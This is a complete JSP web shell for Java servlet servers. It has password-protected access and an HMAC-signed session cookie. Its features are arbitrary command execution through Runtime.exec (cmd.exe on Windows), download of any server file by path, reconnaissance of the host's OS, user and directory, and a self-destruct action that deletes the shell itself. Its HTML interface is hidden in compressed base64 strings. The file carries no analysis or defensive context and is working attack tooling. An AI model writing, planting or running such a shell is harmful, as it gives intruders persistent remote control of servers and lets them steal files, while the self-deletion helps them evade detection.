<%@ page trimDirectiveWhitespaces="true" %><%@ page import="java.io.*,java.security.*,java.security.spec.*,java.util.*,java.util.regex.*,java.util.zip.*,javax.crypto.*,javax.crypto.spec.*,java.nio.file.*,javax.servlet.annotation.MultipartConfig"%><%!
final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
final int TIMEOUT_MINUTES = 120;
final String PASSWORD_HASH = "C80D4230036500C1944AB328E683EF5D2A0F70018F25024A88F9C21964139FC8";
final String WEBSHELL_SECRET = "ecr`;m(}jvSk|M-}Daq(<Wig[)ni@#D\\";
Boolean TOUCH;
HttpServletRequest request;
HttpServletResponse response;
int STATUS_CODE;
List<String> MESSAGES = new ArrayList<String>();
Map<String, String> PAGE_FIELDS = new HashMap<String, String>();
ServletContext application;

String bytesToHex(byte[] bytes) {
    char[] hexChars = new char[bytes.length * 2];
    for (int j = 0; j < bytes.length; j++) {
        int v = bytes[j] & 0xFF;
        hexChars[j * 2] = HEX_ARRAY[v >>> 4];
        hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
    }
    return new String(hexChars);
}

String decompress_template(String compressed_tpl) throws Exception
{
    ByteArrayInputStream byte_stream = new ByteArrayInputStream(Base64.getDecoder().decode(compressed_tpl));
    GZIPInputStream gzip_stream = new GZIPInputStream(byte_stream);
    InputStreamReader input_stream = new InputStreamReader(gzip_stream, "UTF-8");
    StringBuilder sb = new StringBuilder();
    int ch;
    while ((ch = input_stream.read()) != -1) {
        sb.append((char)ch);
    }

    return sb.toString();
}

String process_template(String template)
{
    String messages = "";
    for (String message : MESSAGES) {
        messages += "<div class=\"row message\"> <div class=\"column\"> <blockquote> <p>" + message + "</p> </blockquote> </div> </div>";
    }
    MESSAGES.clear();

    template = template.replace("{{MESSAGES}}", messages);

    Pattern pattern = Pattern.compile("\\{\\{([A-Z_]+)\\}\\}");
    Matcher matcher = pattern.matcher(template);
    while (matcher.find()) {
        String dict_entry = PAGE_FIELDS.containsKey(matcher.group(1)) ? PAGE_FIELDS.get(matcher.group(1)) : "";

        template = template.replace(matcher.group(), dict_entry);
    }

    return template;
}

String main(HttpServletRequest request, HttpServletResponse response, ServletContext application) throws Exception
{
    this.request = request;
    this.response = response;
    this.application = application;
    STATUS_CODE = 200;
    TOUCH = true;
    Boolean authenticated = is_session_valid();
    String provided_password = request.getParameter("pw") != null ? request.getParameter("pw") : "";

    if (!authenticated && !provided_password.equals("")) {
        authenticated = authenticate(provided_password);
    }

    if (!authenticated) {
        return response_login();
    }

    String action = request.getParameter("form_action") != null ? request.getParameter("form_action") : "";

    String page_content = "";

    switch (action) {
        case "download":
            page_content = action_download();
            break;
        case "exec":
            page_content = action_exec();
            break;
        case "logout":
            page_content = action_logout();
            break;
        case "self-destruct":
            page_content = action_self_destruct();
            break;
        default:
            page_content = response_main_page();
            break;
    }

    return page_content;
}

String error_download(String download_path) throws Exception
{
    STATUS_CODE = 500;
    MESSAGES.add("Error: failed to open <code>" + output_encode(download_path) + "</code> for download.");
    return response_main_page();
}

String action_download() throws Exception
{
    String download_path = request.getParameter("download_path") != null ? request.getParameter("download_path") : "";

    if (!download_path.equals("")) {
        Path p;
        try {
            p = Paths.get(download_path);
        } catch (InvalidPathException e) {
            return error_download(download_path);
        }
        File f = p.toFile();
        if (f.exists() && f.isFile()) {
            FileInputStream is;
            try {
                is = new FileInputStream(f);
            } catch (FileNotFoundException e) {
                return error_download(download_path);
            }
            TOUCH = false;
            response.addHeader("Content-Description", "File Transfer");
            response.addHeader("Content-Type", "text/plain");
            response.addHeader("Content-Disposition", "attachment; filename=" + p.getFileName());
            OutputStream rsp = response.getOutputStream();
            byte[] buf = new byte[1024];
            int len;
            while ((len = is.read(buf)) > 0) {
                rsp.write(buf, 0, len);              
            }
            rsp.flush();
            rsp.close();
            is.close();

            return "";
        }
    }
    
    return error_download(download_path);
}

String stream_to_str(InputStream is) throws Exception
{
    InputStreamReader isr = new InputStreamReader(is, "UTF-8");
    StringBuilder sb = new StringBuilder();
    int ch;
    while ((ch = isr.read()) != -1) {
        sb.append((char)ch);
    }

    return sb.toString();
}

Boolean is_windows()
{
    return System.getProperty("os.name").toLowerCase().contains("windows");
}

String exec(String cmd, Boolean include_stderr) throws Exception
{
    String output = "";
    if (is_windows()) {
        cmd = "cmd.exe /c \"" + cmd + "\"";
    }
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        if (include_stderr) {
            output += stream_to_str(p.getErrorStream());
            if (!output.equals("")) {
                STATUS_CODE = 500;
                output += "\n\n";
            }
        }
        output += stream_to_str(p.getInputStream());
    } catch (IOException e) {
        STATUS_CODE = 500;
        output += e.getMessage();
    }

    return output;
}

String get_user() throws Exception
{
    String user = System.getProperty("user.name");
    String cmd_out;
    if (is_windows()) {
        cmd_out = exec("whoami", false).trim();
    } else {
        cmd_out = exec("id", false).trim();
    }

    if (!cmd_out.equals("")) {
        user = cmd_out;
    }

    return user;
}

String action_exec() throws Exception
{
    String cmd = request.getParameter("command") != null ? request.getParameter("command") : "";
    if (!cmd.equals("")) {
        String output = exec(cmd, true);

        PAGE_FIELDS.put("COMMAND_OUTPUT", output_encode(output));
    } else {
        STATUS_CODE = 500;
        PAGE_FIELDS.put("COMMAND_OUTPUT", "No command given!");
    }

    return response_main_page();
}

String action_logout() throws Exception
{
    TOUCH = false;
    delete_cookie("webshell_session");
    response.sendRedirect(request.getRequestURI());

    return "Logged out!";
}

String action_self_destruct() throws Exception
{
    File self = new File(application.getRealPath(request.getServletPath()));

    self.delete();

    return action_logout();
}

String output_encode(String data)
{
    // Java doesn't have any built-in HTML encoding functionality and we can't rely on third party jars being on classpath
    return data.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
}

String response_main_page() throws Exception
{
    String template = decompress_template("H4sICH9/xV4AA3RwbC5odG1sALVVTW/aQBC991eMLPVIneRYYSoCtMqBJoohUU9o7R3ilda7K+8aYiH+e9c2ofgDA1Hhgj0z++bNzswzAECfshWEnGjtOYlcO4MvsPsdekLJ01gcOIuA6HbgZ0IqnWmYMsHgFQPwI+S871rfPyTXQpWvh4/VzBCjSC9KTyBKcOk5P5YyiRckNEwKj8s3mRrn42SQGiMFlH896+FMoDMoo/ouOQdSI1/2KGqTpOFJ5EpwJcFZt9B5AUCU6gVEs7DRibvBfW6HB5EzJzlv24O7WpghAceqrbQHkmZNe+lL2h2lk9oJ0AbjvmsfO+M2m/uh/zBa+H/82WS63R4/YT1Hcp4mg8kKkwvITJ5fJs9XIjPXl1CZ+1cj8vQ6Ps2jH0qKezb2SE6msF3KyVqb82SN1eFrX4fNZjrx/eGvib/dfm4/mFB2/2vJj4KcAMN3rO/a/oTdrkLrYCTjmAja3Ld9aL6TVt9MJKnnKKmtiuy0pao0HelKHIacajTHQ4qw4grAZAo9x+C7zSZIjHlhBVEHFCchRpJTTDyHa+gRDt86EjdQdRrErK6FPZWwmCSZAyvCUxuVl5Ma7KrI7S7J+u31tI3YfmK6TJ9te6q4JLSj8T8ZRxjLtcjj/kPj6Q7qis3/SLFQxES1EXDRhK6yt7DuYtCAP28KzqntamNQf23vt/16t4iGShC0ybitIUL2FpnvcHtz87VtjHbaOXqcToe/x4vH+expPtsLaI2gxe2Qwb84+xy7lQkAAA==");

    if (PAGE_FIELDS.containsKey("COMMAND_OUTPUT")) {
        PAGE_FIELDS.replace("COMMAND_OUTPUT", PAGE_FIELDS.get("COMMAND_OUTPUT"));
    } else {
        PAGE_FIELDS.put("COMMAND_OUTPUT", "Command output will be displayed here");
    }

    PAGE_FIELDS.put("BASIC_SYSTEM", System.getProperty("os.name") + " " + System.getProperty("os.version") + " " +  System.getProperty("os.arch"));
    PAGE_FIELDS.put("BASIC_SERVER", System.getProperty("java.version") + " + " + application.getServerInfo());
    PAGE_FIELDS.put("BASIC_USER", get_user());
    PAGE_FIELDS.put("BASIC_PWD", System.getProperty("user.dir"));

    return process_template(template);
}

String response_login() throws Exception
{
    String messages = "";
    for (String message : MESSAGES) {
        messages += "<p>" + message + "</p>";
    }
    MESSAGES.clear();

    // message format for login page is different
    String template = decompress_template("H4sICPBuvl4AA21haW4udHBsLmFzcACFUc0KgzAMvu8pSu9Ddq+CB9llg4FPULWbhbaRNlVk7N2X6Qa6H5ZTm++H5ItodM9qI0NIuYeBZxv2LLFAajDRugU4EdpdlkdslUNdS9TgREKtFedR1+uxKMt8X5S329rgDN4yq7CFJuUdBOSfanHWyjRB4Sc0wUZWyjByIgca/0TzDuAbkUzAD5F2XUSGY6dI9VRw5qRVs8t/VYiV1chfAVUREdy289pKP3LWSxOJdYCLfo9tskq+b0V9imRxg4SOMH/n5x2x7Wp2rwEAAA==");
    template = template.replace("{{MESSAGES}}", messages);
    
    STATUS_CODE = 403;
    TOUCH       = false;
    return process_template(template);
}

void touch_session() throws Exception
{
    String session_timestamp = Integer.toString(get_timestamp_for_session());
    String session_signature = hash_hmac(session_timestamp, WEBSHELL_SECRET);
    String session = session_timestamp + ":" + session_signature;

    Cookie cookie = new Cookie("webshell_session", session);
    cookie.setMaxAge((TIMEOUT_MINUTES*60));
    response.addCookie(cookie);
}

Boolean authenticate(String provided_password) throws Exception
{
    Boolean result = !provided_password.equals("") ? password_verify(provided_password, PASSWORD_HASH) : false;
    if (!result) {
        MESSAGES.add("Could not successfully authenticate you.");
    }

    return result;
}

String password_hash(String provided_password) throws Exception
{
    PBEKeySpec spec = new PBEKeySpec(provided_password.toCharArray(), "derpyhooves".getBytes("UTF-8"), 10000, 256);
    SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
    byte[] hash = skf.generateSecret(spec).getEncoded();

    return bytesToHex(hash);
}

Boolean password_verify(String provided_password, String stored_hash) throws Exception
{
    String calculated_hash = password_hash(provided_password).toLowerCase();

    return (calculated_hash.equals(stored_hash.toLowerCase()));
}

void delete_cookie(String key)
{
    Cookie[] cookies = request.getCookies();
    for (int i = 0; i < cookies.length; i++) {
        if (cookies[i].getName().equals(key)) {
            cookies[i].setMaxAge(0);
            cookies[i].setValue("");
            response.addCookie(cookies[i]);
            break;
        }
    }
}

String get_cookie(String key)
{
    Cookie[] cookies = request.getCookies();
    if (cookies == null) {
        return "";
    }

    for (Cookie cookie : cookies) {
        if (cookie.getName().equals(key)) {
            return cookie.getValue();
        }
    }

    return "";
}

Boolean is_session_valid() throws Exception
{
    String session = get_cookie("webshell_session");
    String[] parts = session.split(":");
    if (session.equals("") || parts.length != 2) {
        return false;
    }

    String session_timestamp = parts[0];
    String session_signature = parts[1];
    if (session_timestamp.equals("") || session_signature.equals("")) {
        return false;
    }

    Boolean signature_valid = (hash_hmac(session_timestamp, WEBSHELL_SECRET).equals(session_signature));
    if (!signature_valid) {
        return false;
    }
    if (get_timestamp_for_session() - Integer.parseInt(session_timestamp) > TIMEOUT_MINUTES * 60) {
        return false;
    }

    return true;
}

int get_timestamp_for_session()
{
    return Math.toIntExact(System.currentTimeMillis() / 1000L);
}

String hash_hmac(String message, String secret) throws Exception
{
    Mac hmac = Mac.getInstance("HmacSHA256");
    SecretKeySpec secret_key = new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256");
    hmac.init(secret_key);

    return bytesToHex(hmac.doFinal(message.getBytes("UTF-8")));
}
%>
<%
String html = decompress_template("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");
String page_content = "";
try {
    page_content = main(request, response, application);
} catch (Exception e) {
    StringWriter sw = new StringWriter();
    e.printStackTrace(new PrintWriter(sw));
    String exceptionAsString = sw.toString();
    sw.close();
    STATUS_CODE = 500;
    page_content = "Runtime error: <pre><code>" + output_encode(exceptionAsString) + "</code></pre>";
}
if (STATUS_CODE != 200) {
    response.setStatus(STATUS_CODE);
}
if (TOUCH == true) {
    touch_session();
}
if (!page_content.equals("")) {
    html = html.replace("{{PAGE_CONTENT}}", page_content);
    OutputStream rsp = response.getOutputStream();
    rsp.write(html.getBytes("UTF-8"));
    rsp.flush();
    rsp.close();
}
%>